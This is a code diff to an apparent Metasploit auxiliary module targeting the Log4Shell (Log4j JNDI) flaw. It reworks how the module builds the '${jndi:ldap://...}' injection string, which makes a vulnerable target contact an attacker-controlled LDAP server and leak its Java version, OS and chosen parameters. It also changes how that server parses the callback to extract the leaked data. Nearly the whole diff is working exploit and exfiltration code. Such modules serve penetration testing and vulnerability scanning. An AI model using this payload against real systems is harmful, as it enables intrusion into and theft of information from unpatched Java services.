@@ -67,13 +67,12 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def jndi_string(resource)
-    js = "${jndi:ldap://#{datastore['SRVHOST']}:#{datastore['SRVPORT']}/#{resource}/${java:os}/${sys:java.vendor}_${sys:java.version}}"
+    js = "jndi:ldap://#{datastore['SRVHOST']}:#{datastore['SRVPORT']}/#{resource}/${java:os}/${sys:java.vendor}_${sys:java.version}/"
     # We should add obfuscation to the URL string to scan through lousy "next-gen" firewalls
     unless datastore['LEAK_PARAMS'].blank?
-      js = js[0..-2] + '^' + datastore['LEAK_PARAMS'] + '}'
-      vprint_good("Attempting data leak via #{js}")
+      js << datastore['LEAK_PARAMS']
     end
-    js
+    "${#{js}}"
   end
 
   #
@@ -100,13 +99,7 @@ class MetasploitModule < Msf::Auxiliary
                if client.authenticated || datastore['LDAP_AUTH_BYPASS']
                  # Perform query against some loaded LDIF structure
                  treebase = pdu.search_parameters[:base_object].to_s
-                 token, java_os, java_version = treebase.split('/', 3)
-                 if java_version.include?('^')
-                   uri_parts = java_version.split('^')
-                   java_version = uri_parts.shift
-                 else
-                   uri_parts = []
-                 end
+                 token, java_os, java_version, uri_parts = treebase.split('/', 4)
                  target_info = @mutex.synchronize { @tokens.delete(token) }
                  if target_info
                    details = normalize_uri(target_info[:target_uri]).to_s
@@ -114,17 +107,16 @@ class MetasploitModule < Msf::Auxiliary
                    details << " (java: #{java_version})" unless java_version.blank?
                    details << " (os: #{java_os})" unless java_os.blank?
                    unless uri_parts.empty?
+                     uri_parts = uri_parts.split('^')
                      leaked = ''
                      datastore['LEAK_PARAMS'].split('^').each_with_index do |input, idx|
                        next if input == uri_parts[idx]
 
                        leaked << "#{input}=#{uri_parts[idx]}  "
                      end
-                     if leaked.empty?
-                       vprint_status('No information successfully leaked')
-                     else
-                       details << " (leaked: #{leaked.chomp})"
-                       vprint_good("Leaked data: #{leaked.chomp}")
+                     unless leaked.empty?
+                       details << " (leaked: #{leaked.rstrip})"
+                       vprint_good("Leaked data: #{leaked.rstrip}")
                      end
                    end
                    peerinfo = "#{target_info[:rhost]}:#{target_info[:rport]}"
